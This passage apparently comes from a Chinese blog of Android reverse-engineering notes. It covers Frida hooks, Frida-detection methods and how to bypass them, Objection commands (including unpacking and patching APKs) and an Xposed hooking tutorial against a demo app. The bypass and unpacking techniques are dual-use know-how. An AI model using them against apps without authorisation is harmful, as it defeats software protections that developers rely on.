&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (addr_RegisterNatives) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr_RegisterNatives, &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr_RegisterNatives name:&quot;</span>, <span class="title function_">ptr</span>(args[<span class="number">2</span>]).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>())</span><br><span class="line">                <span class="comment">//因为RegisterNatives函数的第三个参数的类型是指针类型，所以要先ptr().readPointer()再读取其中的值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr_RegisterNatives sig:&quot;</span>, <span class="title function_">ptr</span>(args[<span class="number">2</span>]).<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span>).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>());</span><br><span class="line">                <span class="comment">//增加一个指针的长度，也就是我们刚刚分析过程中加密的那一段字符串的值，</span></span><br><span class="line">                <span class="comment">//注意一下这里不是第四个参数，因为这里是一个指针，首先指向了第三个参数的地址，然后从第三个参数的那片内存区域中增加了8个长度，也就是刚刚那段加密的字符串</span></span><br><span class="line">            &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="一些hook方法补充"><a href="#一些hook方法补充" class="headerlink" title="一些hook方法补充"></a>一些hook方法补充</h1><p>byte array to String</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法一</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">JavaString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"><span class="title class_">JavaString</span>.$new(<span class="string">&#x27;byte array&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line"><span class="comment">// 转成 hex 在转 string</span></span><br><span class="line"><span class="title class_">ByteString</span>.<span class="title function_">of</span>(<span class="string">&#x27;byte array&#x27;</span>).<span class="title function_">hex</span>();<span class="comment">//utf8()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出Java.choose()中存在的实例</span></span><br><span class="line"><span class="title function_">getObjClassName</span>(instance) </span><br><span class="line"></span><br><span class="line"><span class="comment">//frida可以通过$className打印类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印当前线程id</span></span><br><span class="line"><span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>当参数是list时</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打印这个参数</span></span><br><span class="line"><span class="keyword">var</span> arrays = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.util.Arrays&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;content: &#x27;</span> + arrays.<span class="title function_">toString</span>(args.<span class="title function_">toArray</span>()));</span><br></pre></td></tr></table></figure><p><strong>frida中实现 官方的保存图片方法</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> path=<span class="string">&quot;/sdcard/Download/tmp/&quot;</span>+<span class="title function_">guid</span>()+<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> file = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>).$new(path);</span><br><span class="line"><span class="keyword">var</span> fos = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(file);</span><br><span class="line"><span class="title class_">Bitmap</span>_Obj.<span class="title function_">compress</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.graphics.Bitmap$CompressFormat&quot;</span>).<span class="property">JPEG</span>.<span class="property">value</span>,<span class="number">100</span>,fos);</span><br><span class="line">fos.<span class="title function_">flush</span>();</span><br><span class="line">fos.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure><p><strong>hextobytes</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">hex</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> bytes = [], c = <span class="number">0</span>; c &lt; hex.<span class="property">length</span>; c += <span class="number">2</span>)</span><br><span class="line">        bytes.<span class="title function_">push</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(c, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br></pre></td></tr></table></figure><h1 id="frida-Stalker-Trace"><a href="#frida-Stalker-Trace" class="headerlink" title="frida Stalker Trace"></a>frida Stalker Trace</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Stalker<span class="selector-class">.follow</span>(<span class="selector-attr">[threadId, options]</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="frida检测"><a href="#frida检测" class="headerlink" title="frida检测"></a>frida检测</h1><p>—b站 《Frida特征检测之高维对抗节》</p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1921073">《安卓逆向这档事》十八、表哥，你也不想你的Frida被检测吧!(上) - 吾爱破解 - 52pojie.cn</a></p><p><strong>r0trace</strong>：安卓Java层多功能追踪脚本</p><p>几种检测方法：</p><ul><li>Frida端口扫描 及关键文件/data/local/tmp下是否有frdia-server</li><li>线程检测</li><li>Maps记录检查 进入进程号路径后 cat Maps。frida注入后maps文件下会有frida-agent-64.so<code>、</code>frida-agent-32.so等文件</li><li>fd检测 进程名路径下 cd fd，cat 0<br>/proc/pid/fd 目录的作用在于提供了一种方便的方式来查看进程的文件描述符信息，这对于调试和监控进程非常有用。通过查看文件描述符信息，可以了解进程打开了哪些文件、网络连接等，帮助开发者和系统管理员进行问题排查和分析工作。</li><li>Trace状态检测  进入进程号路径后 cat status 当然status可能也有frida特征信息，如gmain、pool-frida、gdbus</li><li>内存特征检测</li><li>对frida的检测通常会使用openat、open、strstr、pthread_create、snprintf、sprintf、readlinkat等一系列函数，</li><li>ptrace占坑位，当app主动附加自身进程时，注入就会提示<code>run frida as root</code>这是因为一个进程只能<code>ptrace一次 执行frida -U -f 包名 -l xxx.js</code>即可绕过</li><li>fridaserver使用<strong>D-Bus检测</strong>，D-Bus是一种进程通信机制，通过遍历端口进行socket连接，如果成功则有开放端口，然后看看响应是不是“REJECT”，是则开启frida服务器（一般来讲如果出现一个App启动后过了一会就退出那么就有可能是这种检测方案。）可以遍历/proc/net/tcp文件，或者直接从0-65535向每个开放的端口发送D-bus认证消息，哪个端口回复了REJECT，就是frida-server</li><li>进程名检测，查看是否有frida相关，如fridaserver，但是高版本安卓这个检测无效</li><li>frida-server启动后<code>/proc/net/tcp</code>和<code>/proc/net/tcp6</code>中会有特殊标识:69a2，可以通过搜索tcp中的字符串来检测frida是否启动</li><li>/proc/self/attr/prev 文件若是u:r:zygote:s0，则有用面具的magisk zygisk模块</li><li>proc/pid/status的TracePid值 ==》 proc/pid2/cmdline查看调试器进程名</li></ul><h3 id="追踪监测点"><a href="#追踪监测点" class="headerlink" title="追踪监测点"></a><strong>追踪监测点</strong></h3><ol><li><p>使用r0trace看调用的java层函数</p></li><li><p>hook dlopen函数，加载so文件 一般断在哪里哪里就有可能有frida检测</p><p>可以直接js脚本hook dlopen或者使用frida-trace 找到目标so然后进行分析</p><p><code>frida-trace -U -f package -i dlopen(函数名)</code></p></li></ol><h3 id="几种绕过方法"><a href="#几种绕过方法" class="headerlink" title="几种绕过方法"></a>几种绕过方法</h3><ol><li><p>线程检测 将函数NewObject置空绕过检测<br><img src="2025-01-15-frida与Objection/image-20240504110300858.png" alt="image-20240504110300858"></p></li><li><p>hook strstr函数 匹配上了就strstr返回值置0 类比strcmp<br><img src="2025-01-15-frida与Objection/image-20240504110756791.png" alt=" "></p><p>3.stat函数<br><img src="2025-01-15-frida与Objection/image-20240504111746824.png" alt="image-20240504111746824"></p></li></ol><p>4.fopen函数<br><img src="2025-01-15-frida与Objection/image-20240504112039454.png" alt="image-20240504112039454"></p><p>5.fgets函数<br><img src="2025-01-15-frida与Objection/image-20240504112217742.png" alt="image-20240504112217742"></p><p>6.maps检测 伪造maps<br><img src="2025-01-15-frida与Objection/image-20240504112530798.png" alt="image-20240504112530798"></p><p>7.端口绕过<br>启动frida-server 换进程名，监听0.0.0.0:8899  ./ffff -l 0.0.0.0:8899</p><p>用户端连接方式 ： frida -H ip：端口 -F -l xxx.js</p><p>8.fd检测</p><p>fd的引用一般使用readlink()函数 hook这个函数即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">bool <span class="title function_">check_fd</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR *dir = NULL;</span><br><span class="line">    struct dirent *entry;</span><br><span class="line">    <span class="type">char</span> link_name[<span class="number">100</span>];</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="type">bool</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ((dir = opendir(<span class="string">&quot;/proc/self/fd/&quot;</span>)) == NULL) &#123;</span><br><span class="line">        LOGI(<span class="string">&quot; %s - %d  error:%s&quot;</span>, __FILE__, __LINE__, strerror(errno));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        entry = readdir(dir);</span><br><span class="line">        <span class="keyword">while</span> (entry) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (entry-&gt;d_type) &#123;</span><br><span class="line">                <span class="keyword">case</span> DT_LNK:</span><br><span class="line">                    sprintf(link_name, <span class="string">&quot;%s/%s&quot;</span>, <span class="string">&quot;/proc/self/fd/&quot;</span>, entry-&gt;d_name);</span><br><span class="line">                    readlink(link_name, buf, sizeof(buf));</span><br><span class="line">                    <span class="keyword">if</span> (strstr(buf, <span class="string">&quot;frida&quot;</span>) || strstr(buf, <span class="string">&quot;gum-js-loop&quot;</span>) ||</span><br><span class="line">                        strstr(buf, <span class="string">&quot;gmain&quot;</span>) ||</span><br><span class="line">                        strstr(buf, <span class="string">&quot;-gadget&quot;</span>) || strstr(buf, <span class="string">&quot;linjector&quot;</span>)) &#123;</span><br><span class="line">                        LOGI(<span class="string">&quot;check_fd -&gt; find frida:%s&quot;</span>, buf);</span><br><span class="line">                        ret = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            entry = readdir(dir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>syscall ==》Frida -Seccomp</p><p>b站frida检测分析案例：bilibili <a href="https://bbs.kanxue.com/thread-278282.htm">https://bbs.kanxue.com/thread-278282.htm</a></p><h1 id="Objection使用"><a href="#Objection使用" class="headerlink" title="Objection使用"></a>Objection使用</h1><p>~/.objection/objection.log存放日志，好像每次运行都会在这个log文件中更新，所以在得到特定日志后退出objection，然后把objection.log换名放在别的目录下避免受到干扰 </p><p>进入objection调试时 按空格有提示 !lsp><ul><li>注入进程</li></ul><p><code>objection -g 包名 explore</code></p><ul><li>查看历史命令</li></ul><p><code>commands history</code></p><ul><li>列出内存所有的类</li></ul><p><code>android hooking list classes</code></p><ul><li>列出当前可用activities</li></ul><p><code>android hooking list activities</code></p><ul><li>获得当前界面的activity</li></ul><p><code>android hooking get current_activity</code></p><ul><li>在内存中所有加载的类中搜索包含特定关键词的类</li></ul><p><code>android hooking search classes com.xiaojianbang.app</code></p><ul><li>列出类中的所有方法(不包括构造方法)</li></ul><p><code>android hooking list class_methods com.xiaojianbang.app.MD5</code></p><ul><li>hook类下的所有方法</li></ul><p><code>android hooking watch class com.xiaojianbang.app.MD5</code></p><ul><li>查看hook了多少个类</li></ul><p><code>jobs list</code></p><ul><li>去除hook的类</li></ul><p><code>jobs kill + job ID</code></p><ul><li>hook方法的参数 返回值 调用栈(会默认hook它的重载函数)</li></ul><p><code>android hooking watch class_method com.xiaojianbang.app.MD5.md5_1 --dump-args --dump-return --dump-backtrace</code></p><ul><li>hook其中的一个重载 指定参数类型，多个参数逗号隔开</li></ul><p><code>android hooking watch class_method com.xiaojianbang.app.Utils.test &quot;com.xiaojianbang.app.Money&quot;</code></p><ul><li>搜索堆中的实例</li></ul><p><code>android heap search instances &quot;com.xiaojianbang.app.Money&quot;</code></p><ul><li>列出某个应用中的类</li></ul><p><code>android hooking search classes 包名</code></p><ul><li>寻找某个方法</li></ul><p><code>android hooking search methods+方法名</code></p><ul><li><p>hook 某个特定的方法<br>android hooking watch class_method 方法名 参数1，参数2 —dump-args —dump-backtrace —dump-return</p></li><li><p>调用实例的方法</p></li></ul><p><code>android heap execute 地址(查找实例时的HashCode) 方法名</code></p><ul><li><p>android heap evaluate+查找实例时的HashCode+调用的方法名   调用带参数的方法</p></li><li><p>以ip方式连接</p></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">frida端</span><br><span class="line">./frida-server -l <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">9999</span></span><br><span class="line"></span><br><span class="line">另一端cmd</span><br><span class="line">objection -N -h 手机ip -<span class="selector-tag">p</span> <span class="number">9999</span> -<span class="selector-tag">g</span> 包名 explore</span><br></pre></td></tr></table></figure><ul><li>启动前hook某方法(spawn模式)</li></ul><p><code>objection -N -h 手机ip -p 9999 -g 包名 explore --startup-command &quot;android hooking watch class_method &#39;com.xiaojianbang.app.Utils.getCalc&#39;&quot;</code></p><p>使用Wallbreaker插件</p><ul><li>加载插件</li></ul><p><code>plugin load D:/fridaproject/frida-agent-example/fridascript/Wallbreaker-master</code></p><p>或者</p><p><code>objection -g 包名 export -P + 插件路径</code></p><ul><li>搜索类</li></ul><p><code>plugin wallbreaker classsearch com.xiaojianbang.app.Money</code></p><ul><li>搜索对象</li></ul><p><code>plugin wallbreaker objectsearch com.xiaojianbang.app.Money</code></p><ul><li>输出类的结构</li></ul><p><code>plugin wallbreaker classdump --fullname com.xiaojianbang.app.Money</code></p><ul><li>对象结构</li></ul><p><code>plugin wallbreaker objectdump &lt;handle&gt;</code></p><p>handle为<code>plugin wallbreaker objectsearch com.xiaojianbang.app.Money</code>前面的值</p><p>另一个插件 frida-dexdump 可以脱部分壳 如360</p><ul><li>加载</li></ul><p><code>plugin load D:/fridaproject/frida-agent-example/fridascript/frida-dexdump-master/frida_dexdump</code></p><ul><li>脱壳</li></ul><p><code>plugin dexdump dump</code></p><ul><li><p>开启一个存在的Activity</p><p><code>android intent launch_activity Activity所在的类路径</code><br>frida-dump -UF -d   <code>-d</code>==》深度搜索</p></li><li><p>查看内存中加载的模块</p></li></ul><p><code>memory list modules</code></p><ul><li>查看模块的导出表</li></ul><p><code>memory list exports 模块名</code> —json +路径  打出导出函数名字和地址(到路径中)</p><ul><li>dump指定内存</li></ul><p><code>memory dump frome_base +起始地址+dump的大小 +输出路径</code></p><ul><li>objection 批量trace</li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先 android hooking  android hooking search classes 包名 获得所有的类</span><br><span class="line">再 把命令 android hooking watch <span class="keyword">class</span> 类<span class="number">1</span> android hooking watch <span class="keyword">class</span> 类<span class="number">2.</span>.. 写入一个txt中</span><br><span class="line">最后 执行 objection -g 包名 <span class="keyword">export</span> -c 加载的txt文件</span><br><span class="line">就可以执行txt中的所有命令</span><br><span class="line"></span><br><span class="line">nano cipher.txt</span><br><span class="line">sed -i -e <span class="string">&#x27;s/^/android hooking watch class /&#x27;</span> cipher.txt</span><br><span class="line">注意<span class="keyword">class</span>后面的一个空格</span><br></pre></td></tr></table></figure><ul><li>免root使用objection操作app<br>objection patchapk —architecture + apk中lib下的存在架构 —source apk名称<br>objection  patchapk  —architecture armeabi-v7a —use-aapt2  —source yourAPK.apk</li></ul>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android逆向 </tag>
            
            <tag> hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xposed框架</title>
      <link href="/posts/947764cb.html"/>
      <url>/posts/947764cb.html</url>
      
        <content type="html"><![CDATA[<h1 id="Xposed框架"><a href="#Xposed框架" class="headerlink" title="Xposed框架"></a>Xposed框架</h1><h2 id="一-Hook修改静态变量"><a href="#一-Hook修改静态变量" class="headerlink" title="一.Hook修改静态变量"></a>一.Hook修改静态变量</h2><h3 id="目标：hook掉demo的静态变量tag，staticInt"><a href="#目标：hook掉demo的静态变量tag，staticInt" class="headerlink" title="目标：hook掉demo的静态变量tag，staticInt"></a>目标：hook掉demo的静态变量tag，staticInt<img src="2025-01-15-Xposed框架/image-20230714120304119.png" alt="image-20230714120304119"></h3><h3 id="代码实现如下"><a href="#代码实现如下" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><p>因为xposed是个框架，所以整体框架不会太大变化，主要就是写回调函数handleLoadPackage方法里的东西</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//XposedBridge.log(TAG+&quot;|&quot;+&quot;我抓到你了:&quot;+loadPackageParam.packageName);</span></span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticIntField(clazz,<span class="string">&quot;staticInt&quot;</span>,<span class="number">1000</span>);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Log.d()：输出一些内容，用来标志Start Hook…</li><li>loadPackageParam.packageName.equals(‘包名’)：hook到的包与所给包名相比较。这里就是如果是自己想要的包，就过滤出这个包，并进行下面的操作。</li><li>XposedHelpers.findClass(String className, ClassLoader classLoader):获取该类</li><li>XposedHelpers.setStaticIntField(Class&lt;?&gt; clazz, String fieldName, int value)：修改静态int变量</li><li>XposedHelpers.setStaticObjectField(Class&lt;?&gt; clazz, String fieldName, Object value):修改静态String变量</li></ul><h3 id="生成模块"><a href="#生成模块" class="headerlink" title="生成模块"></a>生成模块</h3><ol><li>点击，生成apk<br><img src="2025-01-15-Xposed框架/image-20230714123338943.png" alt="image-20230714123338943"></li><li>把生成的apk拖入模拟器,进入Xposed框架，激活模块，软重启。</li></ol><h3 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h3><ul><li>安装app，因为我拖动安装说不被允许测试，使用命令 adb install -t app.apk安装</li><li><p>打开demo app<br><img src="2025-01-15-Xposed框架/image-20230714124021025.png" alt="image-20230714124021025"></p></li><li><p>进行过滤：<img src="2025-01-15-Xposed框架/image-20230714122629300.png" alt="image-20230714122629300"></p></li><li><p>执行demo<br><img src="2025-01-15-Xposed框架/image-20230714122801050.png" alt="image-20230714122801050"></p></li><li><p>结果<br><img src="2025-01-15-Xposed框架/image-20230714123145948.png" alt="image-20230714123145948"></p></li></ul><h2 id="二-Hook构造函数"><a href="#二-Hook构造函数" class="headerlink" title="二.Hook构造函数"></a>二.Hook构造函数</h2><h3 id="目标：hook掉demo的构造函数"><a href="#目标：hook掉demo的构造函数" class="headerlink" title="目标：hook掉demo的构造函数"></a>目标：hook掉demo的构造函数<img src="2025-01-15-Xposed框架/image-20230714181704240.png" alt="image-20230714181704240"></h3><h3 id="代码实现如下-1"><a href="#代码实现如下-1" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//XposedBridge.log(TAG+&quot;|&quot;+&quot;我抓到你了:&quot;+loadPackageParam.packageName);</span></span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        <span class="comment">//XposedHelpers.setStaticIntField(clazz,&quot;staticInt&quot;,1000);</span></span><br><span class="line">        <span class="comment">//XposedHelpers.setStaticObjectField(clazz,&quot;Tag&quot;,&quot;zxk1ng&quot;);</span></span><br><span class="line">        XposedHelpers.findAndHookConstructor(clazz, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是无参构造函数前&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是无参构造函数后&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        XposedHelpers.findAndHookConstructor(clazz, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                param.args[<span class="number">0</span>]=<span class="string">&quot;xposed专题&quot;</span>;</span><br><span class="line">            